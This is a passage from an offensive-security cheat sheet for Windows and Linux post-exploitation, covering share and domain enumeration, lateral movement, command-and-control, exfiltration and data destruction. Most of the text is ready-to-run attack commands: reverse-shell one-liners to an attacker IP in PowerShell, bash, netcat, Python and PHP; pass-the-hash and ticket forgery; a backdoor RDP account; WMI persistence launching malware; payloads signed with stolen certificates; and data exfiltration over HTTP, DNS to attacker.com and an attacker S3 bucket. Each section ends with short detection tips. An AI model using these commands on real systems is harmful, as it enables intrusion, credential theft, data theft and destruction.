monitoring\n\n#### Tools / References\n**net.exe**, **PowerShell**, AD Module, **BloodHound**\n\n#### OPSEC / Notes\nUse legitimate administrative tools. Limit query scope. Understand normal enumeration patterns.\n\n### 7.4 Shares and Drives\n\n#### What It Is / Why It Matters\nDiscovering network shares and drives for data access, lateral movement, and information gathering.\n\n#### Quick Steps / Commands\n\n**Network share enumeration:**\n\n```cmd\n# View network shares\nnet view \\\\computer /all\nnet view /domain:corp\n\n# Map network drive\nnet use x: \\\\computer\\share\nnet use x: \\\\computer\\share /user:domain\\user password\n```\n\n**PowerShell share enumeration:**\n\n```powershell\n# SMB share discovery\nGet-SmbShare | Get-SmbShareAccess\n\n# Network discovery\nGet-NetShare -ComputerName 10.10.10.10\n\n# Recursive share listing\nInvoke-ShareFinder -Threads 10\n```\n\n**Share permissions checking:**\n\n```powershell\n# Check share permissions\n(Get-SmbShare -Name \"ShareName\").PresetPathAcl | Format-List\n\n# Accessible shares\nFind-DomainShare -CheckShareAccess -Verbose\n```\n\n#### What to Expect\nNetwork shares with potential sensitive data, configuration files, and lateral movement paths.\n\n#### Detection / Hardening\n*   Share access auditing\n*   **SMB** signing requirements\n*   Share permission reviews\n*   **EDR** file access monitoring\n*   Network segmentation\n\n#### Tools / References\n**net.exe**, **PowerShell**, SmbShare module, **ShareFinder**\n\n#### OPSEC / Notes\nAccess shares minimally. Avoid modifying files. Document findings for reporting.\n\n### 7.5 System Details\n\n#### What It Is / Why It Matters\nGathering system information for vulnerability assessment, privilege escalation, and attack planning.\n\n#### Quick Steps / Commands\n\n**Basic system information:**\n\n```cmd\n# System info\nsysteminfo\nhostname\n\n# Network configuration\nipconfig /all\nroute print\n\n# Environment variables\nset\n```\n\n**PowerShell system enumeration:**\n\n```powershell\n# Comprehensive system info\nGet-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer\n\n# Installed software\nGet-WmiObject -Class Win32_Product | Select-Object Name, Version\n\n# Hotfix information\nGet-HotFix | Sort-Object InstalledOn -Descending\n```\n\n**Privilege and security information:**\n\n```cmd\n# Current privileges\nwhoami /priv\nwhoami /groups\n\n# UAC status\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA\n\n# Defender status\nGet-MpComputerStatus\n```\n\n#### What to Expect\nOS version, installed patches, security controls, and system configuration details.\n\n#### Detection / Hardening\n*   System inventory management\n*   **EDR** system profiling\n*   Configuration management\n*   Regular patching\n*   Security baseline compliance\n\n#### Tools / References\n**systeminfo**, **PowerShell**, **WMI**, **WMIC**\n\n#### OPSEC / Notes\nUse built-in commands. Avoid suspicious tools. Correlate information from multiple sources.\n\n### 7.6 Domain Trusts\n\n#### What It Is / Why It Matters\nUnderstanding trust relationships between domains for cross-domain attacks and privilege escalation.\n\n#### Quick Steps / Commands\n\n**Trust enumeration:**\n\n```cmd\n# Domain trusts\nnltest /domain_trusts\nnltest /dclist:corp\n\n# Net commands\nnet view /domain\n```\n\n**PowerShell trust enumeration:**\n\n```powershell\n# AD trust information\nGet-ADTrust -Filter *\nGet-ADTrust -Identity \"other.domain.com\"\n\n# Forest information\nGet-ADForest\n(Get-ADForest).Domains\n```\n\n**BloodHound trust analysis:**\n\n```bash\n# Collect trust information\nSharpHound.exe --CollectionMethod Trusts\n\n# Analyze in BloodHound for cross-domain attacks\n```\n\n#### What to Expect\nTrust relationships, trust types, and potential cross-domain attack paths.\n\n#### Detection / Hardening\n*   Trust relationship auditing\n*   SID filtering enabled\n*   Selective authentication\n*   Regular trust reviews\n*   Monitor cross-domain authentication\n\n#### Tools / References\n**nltest**, PowerShell AD module, **BloodHound**, AD Trust Toolkit\n\n#### OPSEC / Notes\nUnderstand trust types and implications. Document for attack path analysis.\n\n## 8. 🔁 Lateral Movement\n\n### 8.1 PsExec / WMI / SMB / WinRM\n\n#### What It Is / Why It Matters\nUsing various Windows management protocols to execute commands on remote systems for lateral movement.\n\n#### Quick Steps / Commands\n\n**PsExec execution:**\n\n```cmd\n# PsExec remote execution\nPsExec.exe \\\\target -u user -p pass cmd.exe\nPsExec.exe \\\\target -u user -p pass -s cmd.exe  # As SYSTEM\nPsExec.exe \\\\target -u user -p pass -h powershell.exe  # With elevated token\n\n# Copy and execute\nPsExec.exe \\\\target -c malware.exe\n```\n\n**WMI remote execution:**\n\n```cmd\n# WMI process creation\nwmic /node:target /user:user /password:pass process call create \"cmd.exe /c whoami\"\n\n# WMI with output\nwmic /node:target /user:user /password:pass process call create \"cmd.exe /c ipconfig > C:\\output.txt\"\n```\n\n**SMB file copy and execution:**\n\n```cmd\n# Copy file via SMB\ncopy malware.exe \\\\target\\C$\\Windows\\Temp\\malware.exe\n\n# Schedule execution\nschtasks /create /s target /u user /p pass /tn \"Update\" /tr \"C:\\Windows\\Temp\\malware.exe\" /sc once /st 00:00\nschtasks /run /s target /u user /p pass /tn \"Update\"\n```\n\n**WinRM/PowerShell remoting:**\n\n```powershell\n# Enter-PSSession\n$cred = Get-Credential\nEnter-PSSession -ComputerName target -Credential $cred\n\n# Invoke-Command\nInvoke-Command -ComputerName target -Credential $cred -ScriptBlock { whoami }\n\n# Enable WinRM if disabled\nEnable-PSRemoting -Force\nSet-Item WSMan:\\localhost\\Client\\TrustedHosts -Value \"*\" -Force\n```\n\n#### What to Expect\nRemote command execution with provided credentials. Various authentication methods supported.\n\n#### Detection / Hardening\n*   Network monitoring for management protocols\n*   **EDR** detection of remote execution\n*   Application whitelisting\n*   Restricted admin mode\n*   **JEA** for PowerShell\n\n#### Tools / References\n**PsExec**, **WMI**, **PowerShell**, **CrackMapExec**\n\n#### OPSEC / Notes\nUse legitimate administrative tools. Clean up artifacts. Understand detection capabilities.\n\n### 8.2 Pass-the-Hash / Pass-the-Ticket\n\n#### What It Is / Why It Matters\nUsing captured hashes or Kerberos tickets to authenticate without knowing clear-text passwords.\n\n#### Quick Steps / Commands\n\n**Pass-the-Hash with Mimikatz:**\n\n```bash\n# Mimikatz PTH\nsekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH_HERE /run:cmd.exe\n\n# Over pass-the-hash\nsekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH_HERE /run:powershell.exe\n```\n\n**CrackMapExec for PTH:**\n\n```bash\n# SMB with Pass-the-Hash\ncrackmapexec smb 10.10.10.0/24 -u Administrator -H NTLM_HASH --local-auth\n\n# Multiple commands\ncrackmapexec smb 10.10.10.0/24 -u Administrator -H NTLM_HASH -x \"whoami\"\n```\n\n**Pass-the-Ticket with Rubeus:**\n\n```bash\n# Request TGT\nRubeus.exe asktgt /user:Administrator /domain:corp.local /rc4:NTLM_HASH\n\n# Pass-the-Ticket\nRubeus.exe ptt /ticket:base64_ticket\n\n# Silver ticket creation\nRubeus.exe silver /domain:corp.local /sid:S-1-5-21-... /target:server.corp.local /service:cifs /rc4:SERVICE_HASH /user:Administrator\n```\n\n#### What to Expect\nAuthentication and access with hashes or tickets instead of passwords.\n\n#### Detection / Hardening\n*   Monitor for unusual authentication patterns\n*   Kerberos auditing\n*   **LSA** protection\n*   Restricted admin mode\n*   **Credential Guard**\n\n#### Tools / References\n**Mimikatz**, **Rubeus**, **CrackMapExec**, **Metasploit**\n\n#### OPSEC / Notes\nUnderstand ticket and hash limitations. Clean up ticket caches. Monitor for detection.\n\n### 8.3 Remote Desktop Protocol (RDP)\n\n#### What It Is / Why It Matters\nGraphical remote access to systems for lateral movement and administrative tasks.\n\n#### Quick Steps / Commands\n\n**RDP connection:**\n\n```cmd\n# Windows RDP\nmstsc /v:target:3389\n\n# Linux RDP clients\nxfreerdp /u:user /p:pass /v:target\nrdesktop -u user -p pass target\n```\n\n**RDP through jump hosts:**\n\n```cmd\n# Port forwarding with chisel\n# On jump host: chisel server -p 8080 --reverse\n# On attacker: chisel client jump:8080 R:3389:target:3389\n\n# Then connect to localhost:3389\nmstsc /v:127.0.0.1:3389\n```\n\n**RDP session management:**\n\n```cmd\n# Check RDP sessions\nqwinsta /server:target\nquery session /server:target\n\n# Shadow session (requires specific privileges)\ntscon 2 /dest:console\n```\n\n**RDP hijacking:**\n\n```cmd\n# With SYSTEM privileges\ntscon 2 /dest:rdp-tcp#0\n\n# Create backdoor RDP user\nnet user backdoor Password123! /add\nnet localgroup \"Remote Desktop Users\" backdoor /add\n```\n\n#### What to Expect\nGraphical access to remote systems. File transfer capabilities. Multiple session support.\n\n#### Detection / Hardening\n*   **RDP** connection logging\n*   Network-level authentication\n*   Account lockout policies\n*   **EDR** **RDP** monitoring\n*   **RDP** gateway usage\n\n#### Tools / References\n**mstsc**, **xfreerdp**, **rdesktop**, **Chisel**\n\n#### OPSEC / Notes\nUse **VPN** when possible. Limit **RDP** exposure. Monitor for unusual connections.\n\n### 8.4 Credential Reuse\n\n#### What It Is / Why It Matters\nUsing captured credentials across multiple systems where users may have reused passwords.\n\n#### Quick Steps / Commands\n\n**Password spraying across systems:**\n\n```powershell\n# Test credentials across multiple hosts\n$computers = Get-Content computers.txt\n$cred = Get-Credential\n\nforeach ($computer in $computers) {\n    if (Test-Connection $computer -Count 1 -Quiet) {\n        try {\n            Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { whoami } -ErrorAction Stop\n            Write-Host \"Success on $computer\" -ForegroundColor Green\n        } catch {\n            Write-Host \"Failed on $computer\" -ForegroundColor Red\n        }\n    }\n}\n```\n\n**CrackMapExec for credential reuse:**\n\n```bash\n# Test credentials across network\ncrackmapexec smb 10.10.10.0/24 -u user -p password --continue-on-success\n\n# With hash\ncrackmapexec smb 10.10.10.0/24 -u user -H NTLM_HASH --continue-on-success\n```\n\n**PowerShell remoting with reused creds:**\n\n```powershell\n# Check admin access\nInvoke-CheckLocalAdminAccess -ComputerName target\n\n# Test-WSMan with credentials\nTest-WSMan -ComputerName target -Credential $cred\n```\n\n#### What to Expect\nAccess to multiple systems with same credentials. Common in poorly managed environments.\n\n#### Detection / Hardening\n*   Unique passwords per system\n*   **LAPS** implementation\n*   Account monitoring\n*   Failed login alerts\n*   Password policy enforcement\n\n#### Tools / References\n**CrackMapExec**, **PowerShell**, **Metasploit**, custom scripts\n\n#### OPSEC / Notes\nAvoid account lockouts. Use timing between attempts. Document access patterns.\n\n### 8.5 WMI Event Subscription\n\n#### What It Is / Why It Matters\nCreating WMI event subscriptions for persistence and lateral movement through event-triggered execution.\n\n#### Quick Steps / Commands\n\n**WMI event subscription for persistence:**\n\n```powershell\n# Create event filter\n$FilterArgs = @{\n    Name = 'WindowsUpdateFilter'\n    EventNameSpace = 'root\\cimv2'\n    QueryLanguage = 'WQL'\n    Query = \"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='notepad.exe'\"\n}\n\n$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs\n\n# Create event consumer\n$ConsumerArgs = @{\n    Name = 'WindowsUpdateConsumer'\n    CommandLineTemplate = \"cmd.exe /c C:\\malware.exe\"\n}\n\n$Consumer = Set-WmiInstance -Namespace root/subscription -Class __CommandLineEventConsumer -Arguments $ConsumerArgs\n\n# Bind filter to consumer\n$BindingArgs = @{\n    Filter = $Filter\n    Consumer = $Consumer\n}\n\n$Binding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs\n```\n\n**Remote WMI event subscription:**\n\n```powershell\n# Remote WMI connection\n$Options = New-CimSessionOption -Protocol DCOM\n$Session = New-CimSession -ComputerName target -SessionOption $Options -Credential $cred\n\n# Create subscription on remote system\nInvoke-CimMethod -CimSession $Session -Namespace root/subscription -ClassName __EventFilter -MethodName Create -Arguments $FilterArgs\n```\n\n#### What to Expect\nCode execution triggered by specific system events. Stealthy persistence mechanism.\n\n#### Detection / Hardening\n*   **WMI** event subscription auditing\n*   **EDR** **WMI** monitoring\n*   Application control\n*   Regular **WMI** repository reviews\n*   Monitor **WMI** activity\n\n#### Tools / References\n**PowerShell**, **WMI**, **CIM**, **Metasploit** **WMI** modules\n\n#### OPSEC / Notes\nUse legitimate-looking names. Clean up subscriptions. Understand event trigger conditions.\n\n## 9. 📡 Command & Control (C2)\n\n### 9.1 C2 Frameworks\n\n#### What It Is / Why It Matters\nCentralized platforms for managing compromised systems, executing commands, and maintaining persistent access during engagements.\n\n#### Quick Steps / Commands\n\n**Metasploit handlers:**\n\n```bash\n# Basic reverse handler\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_https\nset LHOST 10.10.14.20\nset LPORT 443\nset ExitOnSession false\nexploit -j\n\n# Staged vs stageless\nset payload windows/meterpreter_reverse_https  # staged\nset payload windows/x64/meterpreter_reverse_https  # 64-bit\nset payload windows/shell_reverse_tcp  # non-meterpreter\n\n# Advanced options\nset SessionCommunicationTimeout 300\nset SessionExpirationTimeout 604800\nset OverrideRequestHost true\n```\n\n**Cobalt Strike teamserver:**\n\n```bash\n# Start teamserver\n./teamserver 10.10.14.20 password profile.profile\n\n# Connect with client\n./cobaltstrike\n\n# Generate payloads\nAttacks → Packages → Windows Executable\nAttacks → Packages → HTML Application\nAttacks → Scripted Web Delivery\n\n# Listener setup\nCobalt Strike → Listeners → Add\n```\n\n**Sliver C2:**\n\n```bash\n# Start server\nsliver-server\n\n# Generate implants\ngenerate --http http://10.10.14.20:80 --os windows --arch amd64\ngenerate --mtls 10.10.14.20:443 --os linux --arch amd64\n\n# List sessions\nsessions\n\n# Interact with implant\nuse <implant-id>\n```\n\n**Empire:**\n\n```bash\n# Start Empire\n./empire\n\n# Listener setup\nuselistener http\nset Host http://10.10.14.20\nset Port 80\nexecute\n\n# Stager generation\nusestager multi/launcher\nset Listener http\nexecute\n```\n\n#### What to Expect\nCentralized control of compromised systems, automated tasking, and post-exploitation modules.\n\n#### Detection / Hardening\n*   Network traffic analysis for C2 patterns\n*   **EDR** behavioral detection\n*   Certificate pinning\n*   Network segmentation\n*   C2 domain blocking\n\n#### Tools / References\n**Metasploit**, **Cobalt Strike**, **Sliver**, **Empire**, **Covenant**\n\n#### OPSEC / Notes\nUse encrypted channels, domain fronting, and legitimate-looking traffic patterns. Rotate infrastructure regularly.\n\n### 9.2 Protocols (HTTP/S, DNS, etc.)\n\n#### What It Is / Why It Matters\nUsing various network protocols for C2 communication to bypass network controls and evade detection.\n\n#### Quick Steps / Commands\n\n**HTTP/S C2:**\n\n```bash\n# Metasploit HTTP/S handler\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_https\nset LHOST 10.10.14.20\nset LPORT 443\nset OverrideRequestHost true\nset OverrideLHOST google.com  # Domain fronting\n\n# Cobalt Strike Malleable C2 profile\nhttp-get {\n    set uri \"/api/collect\";\n    client {\n        header \"User-Agent\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\";\n        metadata {\n            base64url;\n            prepend \"token=\";\n            header \"Cookie\";\n        }\n    }\n    server {\n        header \"Server\" \"Apache\";\n        output {\n            base64url;\n            print;\n        }\n    }\n}\n```\n\n**DNS C2:**\n\n```bash\n# dnscat2 setup\n# Server\nsudo ruby dnscat2.rb --dns domain=attacker.com,host=0.0.0.0\n\n# Client\ndnscat2.exe --dns server=10.10.14.20,port=53 --secret=mysecret\n\n# Cobalt Strike DNS beacon\n# Configure DNS listener with domains\n```\n\n**ICMP C2:**\n\n```bash\n# icmpsh server\npython icmpsh_m.py 10.10.14.20 10.10.10.50\n\n# Client execution (Windows)\nicmpsh.exe -t 10.10.14.20 -d 500 -s 128 -r 10\n```\n\n**SMB C2:**\n\n```bash\n# Metasploit SMB beacon\nuse payload windows/smb/meterpreter_reverse_tcp\nset LHOST 10.10.14.20\nset LPORT 445\n\n# Named pipe communication\nuse exploit/windows/local/pipe_scheduler\n```\n\n#### What to Expect\nStealthy C2 channels that blend with normal network traffic. Protocol-specific advantages and limitations.\n\n#### Detection / Hardening\n*   Protocol anomaly detection\n*   DNS query monitoring\n*   ICMP payload inspection\n*   SMB signing enforcement\n*   Network traffic baselining\n\n#### Tools / References\n**dnscat2**, **icmpsh**, **Metasploit**, **Cobalt Strike**\n\n#### OPSEC / Notes\nMatch protocol to target environment. Use encryption and obfuscation. Monitor for protocol-specific detection.\n\n### 9.3 Beacon Configuration\n\n#### What It Is / Why It Matters\nConfiguring C2 beacon behavior for stealth, resilience, and operational effectiveness.\n\n#### Quick Steps / Commands\n\n**Sleep and jitter settings:**\n\n```bash\n# Cobalt Strike sleep settings\nbeacon> sleep 60000    # 60 seconds between callbacks\nbeacon> jitter 25      # 25% random variation\nbeacon> sleep 0        # For interactive tasks\n\n# Metasploit timing\nset SessionCommunicationTimeout 300\nset SessionExpirationTimeout 604800\n```\n\n**Working hours:**\n\n```bash\n# Set beacon working hours (Cobalt Strike)\nbeacon> set working-hours \"9-17\"\n\n# Or in Malleable C2 profile\ncode-signer {\n    set keystore \"keystore.jks\";\n    set password \"password\";\n    set alias \"example\";\n}\n```\n\n**Staging options:**\n\n```bash\n# Stageless payload generation\nmsfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.14.20 LPORT=443 -f exe -o beacon.exe\n\n# With custom template\nmsfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.14.20 LPORT=443 -x legit.exe -f exe -o hidden.exe\n```\n\n**Malleable C2 profiles:**\n\n```c\n# Example profile for traffic mimicry\nhttp-get {\n    set uri \"/search\";\n    client {\n        parameter \"q\" \"search term\";\n        header \"Accept\" \"text/html\";\n        metadata {\n            netbios;\n            parameter \"q\";\n        }\n    }\n    server {\n        header \"Content-Type\" \"text/html\";\n        output {\n            netbios;\n            print;\n        }\n    }\n}\n```\n\n#### What to Expect\nControlled beacon behavior, reduced detection risk, and operational flexibility.\n\n#### Detection / Hardening\n*   Beacon timing analysis\n*   Traffic pattern recognition\n*   Certificate validation\n*   Behavioral analysis\n*   Memory scanning\n\n#### Tools / References\n**Cobalt Strike**, **Metasploit**, Malleable C2, **Arsenal Image Mounter**\n\n#### OPSEC / Notes\nTest profiles against target security controls. Adjust timing based on engagement scope.\n\n### 9.4 C2 Evasion\n\n#### What It Is / Why It Matters\nTechniques to avoid C2 detection by network security controls and **EDR** solutions.\n\n#### Quick Steps / Commands\n\n**Domain fronting:**\n\n```bash\n# Using CDN for fronting\nset OverrideLHOST front.domain.com\nset OverrideRequestHost true\n\n# CloudFront setup\n# Create CloudFront distribution pointing to C2 server\n# Use distribution domain in payloads\n```\n\n**Traffic segmentation:**\n\n```bash\n# Multiple listeners for different purposes\n# HTTP for small commands\n# HTTPS for data exfiltration\n# DNS for critical infrastructure\n\n# Cobalt Strike redirectors\nsocat TCP-LISTEN:80,fork TCP:teamserver:80\n```\n\n**Protocol hopping:**\n\n```bash\n# Change protocols based on context\nhttp-get → https-post → dns\n\n# Metasploit transport changing\nmeterpreter > transport add -t reverse_https -l 10.10.14.20 -p 443\nmeterpreter > transport next\n```\n\n**Code signing and obfuscation:**\n\n```bash\n# Sign payloads with stolen certificates\nsigthief.py -i legit.exe -t malware.exe -o signed_malware.exe\n\n# Binary obfuscation\nupx -9 beacon.exe\n```\n\n#### What to Expect\nReduced detection rates and extended C2 lifespan through evasion techniques.\n\n#### Detection / Hardening\n*   TLS inspection\n*   Certificate transparency monitoring\n*   Behavioral correlation\n*   Network baselining\n*   **EDR** integration\n\n#### Tools / References\n**DomainFrontingTools**, **socat**, **Metasploit**, **Cobalt Strike**\n\n#### OPSEC / Notes\nBalance evasion with functionality. Test against target controls. Have fallback mechanisms.\n\n### 9.5 Reverse Shells & One-Liners\n\n#### What It Is / Why It Matters\nQuick command execution for initial access and establishing C2 channels without full implants.\n\n#### Quick Steps / Commands\n\n**PowerShell reverse shells:**\n\n```powershell\n# Basic one-liner\npowershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.20',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n\n# Base64 encoded\n$command = 'above command'\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encoded = [Convert]::ToBase64String($bytes)\npowershell -enc $encoded\n```\n\n**Netcat reverse shells:**\n\n```bash\n# Linux\nnc -e /bin/sh 10.10.14.20 443\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.20 443 >/tmp/f\n\n# Windows\nnc.exe 10.10.14.20 443 -e cmd.exe\n```\n\n**Python reverse shells:**\n\n```python\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.20\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n# Python3 with error handling\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.20\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'\n```\n\n**Bash reverse shells:**\n\n```bash\nbash -i >& /dev/tcp/10.10.14.20/443 0>&1\n\n# Alternative bash\n/bin/bash -l > /dev/tcp/10.10.14.20/443 0<&1 2>&1\n\n# With socat\nsocat TCP:10.10.14.20:443 EXEC:/bin/bash\n```\n\n**PHP reverse shells:**\n\n```php\n<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.20/443 0>&1'\");?>\n\n<?php system('nc -e /bin/sh 10.10.14.20 443'); ?>\n```\n\n#### What to Expect\nImmediate shell access for quick tasks or initial foothold establishment.\n\n#### Detection / Hardening\n*   Network monitoring for reverse connections\n*   Process lineage monitoring\n*   Application control\n*   **EDR** shell detection\n*   Outbound connection filtering\n\n#### Tools / References\n**Netcat**, **PowerShell**, **Python**, **Bash**, **RevShells.com**\n\n#### OPSEC / Notes\nUse encoded versions when possible. Consider staging to full implants. Clean up after use.\n\n## 10. 📤 Exfiltration\n\n### 10.1 Compressing & Encoding Data\n\n#### What It Is / Why It Matters\nPreparing data for exfiltration by reducing size and obfuscating content to avoid detection.\n\n#### Quick Steps / Commands\n\n**Compression techniques:**\n\n```bash\n# Windows compression\npowershell Compress-Archive -Path C:\\sensitive\\* -DestinationPath C:\\temp\\data.zip\n\n# Linux compression\ntar -czf data.tar.gz /home/user/sensitive/\nzip -r data.zip /home/user/sensitive/\n\n# 7zip for better compression\n7z a -pPassword123 data.7z C:\\sensitive\\\n```\n\n**Encoding methods:**\n\n```powershell\n# Base64 encoding\n$fileContent = [System.IO.File]::ReadAllBytes(\"C:\\sensitive\\document.pdf\")\n$encoded = [Convert]::ToBase64String($fileContent)\n$encoded | Out-File -FilePath \"C:\\temp\\encoded.txt\"\n\n# Split large files\nSplit-File -InputFile data.zip -PartSizeBytes 1MB\n\n# XOR encoding\n$key = 0x54\n$bytes = [System.IO.File]::ReadAllBytes(\"file.txt\")\nfor($i=0; $i -lt $bytes.Length; $i++) {\n    $bytes[$i] = $bytes[$i] -bxor $key\n}\n[System.IO.File]::WriteAllBytes(\"file.enc\", $bytes)\n```\n\n**Steganography:**\n\n```bash\n# Hide data in images\nsteghide embed -cf image.jpg -ef secret.txt -p \"password\"\n\n# Using outguess\noutguess -k \"mykey\" -d secret.txt image.jpg output.jpg\n```\n\n#### What to Expect\nReduced file sizes and obfuscated content for stealthy exfiltration.\n\n#### Detection / Hardening\n*   Data loss prevention (**DLP**)\n*   File transfer monitoring\n*   Compression tool detection\n*   Entropy analysis for encoded data\n*   **EDR** file activity monitoring\n\n#### Tools / References\n**7zip**, **tar**, **PowerShell**, **steghide**, **outguess**\n\n#### OPSEC / Notes\nUse common compression formats. Avoid unusual file sizes. Test against **DLP** solutions.\n\n### 10.2 Using Common Ports\n\n#### What It Is / Why It Matters\nExfiltrating data over commonly allowed ports (**HTTP/S**, **DNS**, **SMTP**) to bypass egress filtering.\n\n#### Quick Steps / Commands\n\n**HTTP/S exfiltration:**\n\n```bash\n# Using curl\ncurl -X POST -F \"file=@data.zip\" http://10.10.14.20/upload\n\n# PowerShell HTTP upload\nInvoke-WebRequest -Uri \"http://10.10.14.20/upload\" -Method POST -InFile \"data.zip\"\n\n# Using certutil for chunks\ncertutil -encode data.zip encoded.txt\n# Then transfer encoded.txt in chunks via HTTP\n```\n\n**DNS exfiltration:**\n\n```bash\n# Data in DNS queries\n# Encode data as subdomains\nencoded_data=$(echo \"secret\" | base64)\ndig @10.10.14.20 $encoded_data.attacker.com\n\n# PowerShell DNS exfiltration\n$data = [System.IO.File]::ReadAllBytes(\"file.txt\")\n$b64 = [Convert]::ToBase64String($data)\n$chunks = $b64 -split '(.{63})' -ne ''\nforeach($chunk in $chunks) {\n    Resolve-DnsName \"$chunk.attacker.com\" -Server 10.10.14.20\n}\n```\n\n**ICMP exfiltration:**\n\n```bash\n# Data in ICMP payloads\n# Server: sudo tcpdump -i eth0 icmp -A\n# Client: ping -c 1 -p $(echo \"secret\" | xxd -p) 10.10.14.20\n```\n\n#### What to Expect\nData transfer over allowed protocols, potentially slower but more stealthy.\n\n#### Detection / Hardening\n*   Protocol anomaly detection\n*   DNS query monitoring\n*   HTTP payload inspection\n*   Egress filtering\n*   Data transfer baselining\n\n#### Tools / References\n**curl**, **PowerShell**, **dig**, **tcpdump**, custom scripts\n\n#### OPSEC / Notes\nMatch normal traffic patterns. Use rate limiting. Consider data sensitivity.\n\n### 10.3 Cloud Exfiltration\n\n#### What It Is / Why It Matters\nUsing cloud services for data exfiltration to blend with legitimate traffic and leverage trusted domains.\n\n#### Quick Steps / Commands\n\n**AWS S3 exfiltration:**\n\n```bash\n# AWS CLI upload\naws s3 cp sensitive.txt s3://attacker-bucket/\n\n# With encryption\naws s3 cp sensitive.txt s3://attacker-bucket/ --sse AES256\n\n# PowerShell with AWS Tools\nWrite-S3Object -BucketName attacker-bucket -File sensitive.txt\n```\n\n**Azure Blob Storage:**\n\n```bash\n# Azure CLI upload\naz storage blob upload --account-name attacker --container exfil --name data.txt --file sensitive.txt\n\n# With SAS token\naz storage blob upload --account-name attacker --container exfil --name data.txt --file sensitive.txt --sas-token \"sv=2020-08-04&ss=b&srt=sco&sp=rwdlacx&se=2024-01-01T00:00:00Z&st=2023-01-01T00:00:00Z&spr=https&sig=...\"\n```\n\n**Google Drive:**\n\n```python\n# Python with Google Drive API\nfrom googleapiclient.discovery import build\nfrom googleapiclient.http import MediaFileUpload\n\nservice = build('drive', 'v3', credentials=creds)\nfile_metadata = {'name': 'data.txt'}\nmedia = MediaFileUpload('sensitive.txt', mimetype='text/plain')\nservice.files().create(body=file_metadata, media_body=media, fields='id').execute()\n```\n\n**Dropbox exfiltration:**\n\n```bash\n# Dropbox upload\ncurl -X POST https://content.dropboxapi.com/2/files/upload \\\n    --header \"Authorization: Bearer <ACCESS_TOKEN>\" \\\n    --header \"Dropbox-API-Arg: {\\\"path\\\": \\\"/data.txt\\\"}\" \\\n    --data-binary @sensitive.txt\n```\n\n#### What to Expect\nData transfer to cloud storage, potentially bypassing network controls through trusted domains.\n\n#### Detection / Hardening\n*   Cloud access monitoring\n*   **DLP** for cloud services\n*   API key monitoring\n*   Unusual upload patterns\n*   Cloud security posture management\n\n#### Tools / References\n**AWS CLI**, **Azure CLI**, **Google APIs**, **Dropbox API**\n\n#### OPSEC / Notes\nUse legitimate-looking bucket names. Monitor for rate limiting. Clean up after exfiltration.\n\n### 10.4 DNS/ICMP Tunnels\n\n#### What It Is / Why It Matters\nUsing protocol tunnels for data exfiltration that bypass traditional firewall rules and monitoring.\n\n#### Quick Steps / Commands\n\n**DNS tunneling:**\n\n```bash\n# dnscat2 setup\n# Server\nsudo ruby dnscat2.rb --dns domain=attacker.com,host=0.0.0.0\n\n# Client\ndnscat2.exe --dns server=10.10.14.20,port=53 --secret=mysecret\n\n# Data exfiltration through DNS\ncat file.txt | while read line; do dig @10.10.14.20 \"$line.attacker.com\"; done\n```\n\n**ICMP tunneling:**\n\n```bash\n# ptunnel setup\n# Server\nptunnel -x password\n\n# Client\nptunnel -p 10.10.14.20 -lp 1080 -da target.com -dp 22 -x password\n\n# Then use SOCKS proxy for data transfer\n```\n\n**HTTP tunneling:**\n\n```bash\n# Using httptunnel\n# Server\nhts --forward-port localhost:22 80\n\n# Client\nhtc --forward-port 8080 example.com:80\nssh -p 8080 user@localhost\n```\n\n**SSH tunneling for exfiltration:**\n\n```bash\n# SSH port forwarding\nssh -R 8080:localhost:80 user@10.10.14.20\n# Then exfiltrate through the tunnel\n\n# Dynamic port forwarding (SOCKS)\nssh -D 1080 user@10.10.14.20\n```\n\n#### What to Expect\nStealthy data transfer through protocol tunnels, often slower but harder to detect.\n\n#### Detection / Hardening\n*   DNS query analysis\n*   ICMP payload inspection\n*   Protocol anomaly detection\n*   Tunnel traffic monitoring\n*   Egress filtering\n\n#### Tools / References\n**dnscat2**, **ptunnel**, **httptunnel**, **SSH**\n\n#### OPSEC / Notes\nUse encryption within tunnels. Monitor performance impact. Have backup methods.\n\n## 11. 💣 Impact / Actions on Objectives\n\n### 11.1 Data Destruction\n\n#### What It Is / Why It Matters\nDeleting or corrupting data to disrupt operations, often used in ransomware or wiper attacks.\n\n#### Quick Steps / Commands\n\n**File deletion scripts:**\n\n```bash\n# Linux recursive deletion\nrm -rf /home/user/documents/*\nfind /home/user -type f -exec rm {} 